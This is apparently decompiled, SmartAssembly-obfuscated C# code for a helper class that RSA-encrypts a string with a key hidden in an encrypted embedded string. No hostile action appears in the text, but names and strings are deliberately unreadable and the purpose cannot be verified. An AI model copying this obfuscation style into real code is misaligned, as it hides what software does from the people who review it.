using System;
using System.Security.Cryptography;
using System.Text;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace edKqEixVoGgLte;

public static class SwirPclUHWNCec
{
	private static bool ySqrPgMYQeMGX;

	private static readonly string jckmDBAnybiY;

	[NonSerialized]
	internal static GetString getString_0;

	public static string RAWIZpYvlBsHh(string string_0)
	{
		int OxwnjUYELTR = 0;
		string wpTTcoJsHGtJmY = getString_0(107393316);
		ojhSfGwlyPKm(jckmDBAnybiY, out OxwnjUYELTR, out wpTTcoJsHGtJmY);
		byte[] inArray = EnKYmELdDi(Encoding.UTF8.GetBytes(string_0), OxwnjUYELTR, wpTTcoJsHGtJmY);
		return Convert.ToBase64String(inArray);
	}

	private static byte[] EnKYmELdDi(byte[] byte_0, int int_0, string string_0)
	{
		if (byte_0 != null && byte_0.Length != 0)
		{
			int num = GQfyHAUTnqCOG(int_0);
			if (byte_0.Length > num)
			{
				throw new ArgumentException(string.Format(getString_0(107407640), num), getString_0(107407649));
			}
			if (!ZUjTWXrxUEnCwVy(int_0))
			{
				throw new ArgumentException(getString_0(107407603), getString_0(107407574));
			}
			if (string.IsNullOrEmpty(string_0))
			{
				throw new ArgumentException(getString_0(107407593), getString_0(107407564));
			}
			using RSACryptoServiceProvider rSACryptoServiceProvider = new RSACryptoServiceProvider(int_0);
			rSACryptoServiceProvider.FromXmlString(string_0);
			return rSACryptoServiceProvider.Encrypt(byte_0, ySqrPgMYQeMGX);
		}
		throw new ArgumentException(getString_0(107407670), getString_0(107407649));
	}

	private static int GQfyHAUTnqCOG(int int_0)
	{
		if (ySqrPgMYQeMGX)
		{
			return (int_0 - 384) / 8 + 7;
		}
		return (int_0 - 384) / 8 + 37;
	}

	private static bool ZUjTWXrxUEnCwVy(int int_0)
	{
		if (int_0 >= 384 && int_0 <= 16384)
		{
			return int_0 % 8 == 0;
		}
		return false;
	}

	private static void ojhSfGwlyPKm(string kpNKCjVyfr, out int OxwnjUYELTR, out string wpTTcoJsHGtJmY)
	{
		OxwnjUYELTR = 0;
		wpTTcoJsHGtJmY = getString_0(107393316);
		if (kpNKCjVyfr == null || kpNKCjVyfr.Length <= 0)
		{
			return;
		}
		byte[] bytes = Convert.FromBase64String(kpNKCjVyfr);
		string @string = Encoding.UTF8.GetString(bytes);
		if (@string.Contains(getString_0(107407515)))
		{
			string[] array = @string.Split(new char[1] { '!' }, 2);
			try
			{
				OxwnjUYELTR = int.Parse(array[0]);
				wpTTcoJsHGtJmY = array[1];
			}
			catch (Exception)
			{
			}
		}
	}

	static SwirPclUHWNCec()
	{
		Strings.CreateGetStringDelegate(typeof(SwirPclUHWNCec));
		ySqrPgMYQeMGX = false;
		jckmDBAnybiY = getString_0(107407510);
	}
}
